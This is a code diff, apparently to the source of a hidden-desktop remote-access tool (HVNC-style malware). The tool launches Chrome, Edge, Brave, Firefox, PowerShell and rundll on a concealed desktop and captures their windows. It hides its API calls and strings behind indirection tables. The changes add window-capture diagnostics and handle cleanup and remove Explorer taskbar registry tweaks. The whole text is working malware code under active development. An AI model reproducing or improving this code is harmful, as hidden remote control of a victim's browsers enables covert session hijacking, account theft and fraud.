@@ -46,6 +46,9 @@ static char       g_desktopName[MAX_PATH];
 static HWND       g_lastInputHwnd = NULL;
 static DWORD      g_lastDesktopDumpTick = 0;
 static BOOL       g_dumpedInputDesktopState = FALSE;
+static DWORD      g_lastCaptureShellSkipLogTick = 0;
+static DWORD      g_lastCaptureHungSkipLogTick = 0;
+static DWORD      g_lastCaptureSlowPrintLogTick = 0;
 static ULARGE_INTEGER lisize;
 static LARGE_INTEGER offset;
 
@@ -277,6 +280,76 @@ static BOOL IsExcludedInputClass(const char *className)
         !lstrcmpiA(className, "IME") ||
         !lstrcmpiA(className, "MSCTFIME UI") ||
         !lstrcmpiA(className, "SysShadow");
+}
+
+static BOOL IsShellCaptureClass(const char *className)
+{
+    if (!className || !className[0])
+        return FALSE;
+
+    return !lstrcmpiA(className, "UserOOBEWindowClass") ||
+        !lstrcmpiA(className, "Shell_TrayWnd") ||
+        !lstrcmpiA(className, "Progman") ||
+        !lstrcmpiA(className, "WorkerW") ||
+        !lstrcmpiA(className, "SysShadow") ||
+        !lstrcmpiA(className, "tooltips_class32") ||
+        !lstrcmpiA(className, "IME") ||
+        !lstrcmpiA(className, "MSCTFIME UI");
+}
+
+static BOOL ShouldLogCaptureEvent(DWORD *lastTick, DWORD intervalMs)
+{
+    DWORD now = GetTickCount();
+    if (!*lastTick || now - *lastTick >= intervalMs)
+    {
+        *lastTick = now;
+        return TRUE;
+    }
+    return FALSE;
+}
+
+static void LogCaptureWindow(const char *reason, HWND hWnd, DWORD detail)
+{
+    char className[128] = { 0 };
+    char title[128] = { 0 };
+    RECT rect = { 0 };
+    DWORD pid = 0;
+    DWORD tid = hWnd ? GetWindowThreadProcessId(hWnd, &pid) : 0;
+
+    if (hWnd)
+    {
+        DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+        GetWindowRect(hWnd, &rect);
+    }
+
+    printf("[capture] %s hwnd=0x%p class='%s' title='%s' pid=%lu tid=%lu rect=(%ld,%ld,%ld,%ld) detail=%lu\n",
+        reason ? reason : "event",
+        hWnd,
+        className,
+        title,
+        pid,
+        tid,
+        rect.left,
+        rect.top,
+        rect.right,
+        rect.bottom,
+        detail);
+}
+
+static void CloseProcessInformationHandles(PROCESS_INFORMATION *processInfo)
+{
+    if (!processInfo)
+        return;
+    if (processInfo->hThread)
+    {
+        Funcs::pCloseHandle(processInfo->hThread);
+        processInfo->hThread = NULL;
+    }
+    if (processInfo->hProcess)
+    {
+        Funcs::pCloseHandle(processInfo->hProcess);
+        processInfo->hProcess = NULL;
+    }
 }
 
 struct HitTestContext
@@ -686,6 +759,16 @@ static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
     BOOL ret = FALSE;
     RECT rect;
     Funcs::pGetWindowRect(hWnd, &rect);
+    DWORD_PTR timeoutResult = 0;
+
+    SetLastError(0);
+    if (!SendMessageTimeoutA(hWnd, WM_NULL, 0, 0, SMTO_ABORTIFHUNG | SMTO_BLOCK, 100, &timeoutResult))
+    {
+        DWORD err = GetLastError();
+        if (ShouldLogCaptureEvent(&g_lastCaptureHungSkipLogTick, 3000))
+            LogCaptureWindow("skip hung window", hWnd, err);
+        return FALSE;
+    }
 
     HDC     hDcWindow = Funcs::pCreateCompatibleDC(hDc);
     HBITMAP hBmpWindow = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
@@ -696,8 +779,13 @@ static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
     hOldBmpWindow = Funcs::pSelectObject(hDcWindow, hBmpWindow);
     if (!hOldBmpWindow)
         goto exit;
+
+    DWORD printStart = GetTickCount();
     if (Funcs::pPrintWindow(hWnd, hDcWindow, PW_RENDERFULLCONTENT))
     {
+        DWORD printMs = GetTickCount() - printStart;
+        if (printMs >= 100 && ShouldLogCaptureEvent(&g_lastCaptureSlowPrintLogTick, 3000))
+            LogCaptureWindow("slow PrintWindow", hWnd, printMs);
         Funcs::pBitBlt(hDcScreen,
             rect.left,
             rect.top,
@@ -709,6 +797,12 @@ static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
             SRCCOPY);
 
         ret = TRUE;
+    }
+    else
+    {
+        DWORD printMs = GetTickCount() - printStart;
+        if (printMs >= 100 && ShouldLogCaptureEvent(&g_lastCaptureSlowPrintLogTick, 3000))
+            LogCaptureWindow("slow PrintWindow", hWnd, printMs);
     }
     Funcs::pSelectObject(hDcWindow, hOldBmpWindow);
 exit:
@@ -741,6 +835,15 @@ static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
 
     if (!Funcs::pIsWindowVisible(hWnd))
         return TRUE;
+
+    char className[128] = { 0 };
+    GetClassNameA(hWnd, className, sizeof(className));
+    if (IsShellCaptureClass(className))
+    {
+        if (ShouldLogCaptureEvent(&g_lastCaptureShellSkipLogTick, 3000))
+            LogCaptureWindow("skip shell window", hWnd, 0);
+        return TRUE;
+    }
 
     PaintWindow(hWnd, data->hDc, data->hDcScreen);
 
@@ -1555,7 +1658,8 @@ static void StartChrome()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static void StartEdge()
@@ -1569,7 +1673,8 @@ static void StartEdge()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static void StartBrave()
@@ -1584,7 +1689,8 @@ static void StartBrave()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static void StartFirefox()
@@ -1661,7 +1767,8 @@ static void StartFirefox()
 
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
-    Funcs::pCreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 
 exit:
     Funcs::pCloseHandle(hProfilesIni);
@@ -1679,7 +1786,8 @@ static void StartPowershell()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static void StartIe()
@@ -1692,7 +1800,8 @@ static void StartIe()
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.lpDesktop = g_desktopName;
     PROCESS_INFORMATION processInfo = { 0 };
-    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+    if (Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+        CloseProcessInformationHandles(&processInfo);
 }
 
 static DWORD WINAPI InputThread(LPVOID param)
@@ -1772,19 +1881,6 @@ static DWORD WINAPI InputThread(LPVOID param)
         {
         case WmStartApp::startExplorer:
         {
-            const DWORD neverCombine = 2;
-            const char *valueName = Strs::hd4;
-
-            HKEY hKey;
-            Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::hd3, 0, KEY_ALL_ACCESS, &hKey);
-            DWORD value;
-            DWORD size = sizeof(DWORD);
-            DWORD type = REG_DWORD;
-            Funcs::pRegQueryValueExA(hKey, valueName, 0, &type, (BYTE *)&value, &size);
-
-            if (value != neverCombine)
-                Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&neverCombine, size);
-
             char explorerPath[MAX_PATH] = { 0 };
             Funcs::pGetWindowsDirectoryA(explorerPath, MAX_PATH);
             Funcs::pLstrcatA(explorerPath, Strs::fileDiv);
@@ -1805,25 +1901,10 @@ static DWORD WINAPI InputThread(LPVOID param)
                 GetLastError());
             if (createdExplorer)
             {
-                Funcs::pCloseHandle(processInfo.hThread);
-                Funcs::pCloseHandle(processInfo.hProcess);
+                CloseProcessInformationHandles(&processInfo);
             }
 
-            APPBARDATA appbarData;
-            appbarData.cbSize = sizeof(appbarData);
-            for (int i = 0; i < 5; ++i)
-            {
-                Sleep(1000);
-                appbarData.hWnd = Funcs::pFindWindowA(Strs::shell_TrayWnd, NULL);
-                if (appbarData.hWnd)
-                    break;
-            }
-
-            appbarData.lParam = ABS_ALWAYSONTOP;
-            Funcs::pSHAppBarMessage(ABM_SETSTATE, &appbarData);
-
-            Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&value, size);
-            Funcs::pRegCloseKey(hKey);
+            printf("[diag] startExplorer skipped global Explorer taskbar registry/appbar changes\n");
             DumpHiddenDesktopWindows("after-startExplorer");
             break;
         }
@@ -1837,7 +1918,8 @@ static DWORD WINAPI InputThread(LPVOID param)
             startupInfo.cb = sizeof(startupInfo);
             startupInfo.lpDesktop = g_desktopName;
             PROCESS_INFORMATION processInfo = { 0 };
-            Funcs::pCreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+            if (Funcs::pCreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo))
+                CloseProcessInformationHandles(&processInfo);
             break;
         }
         case WmStartApp::startPowershell:
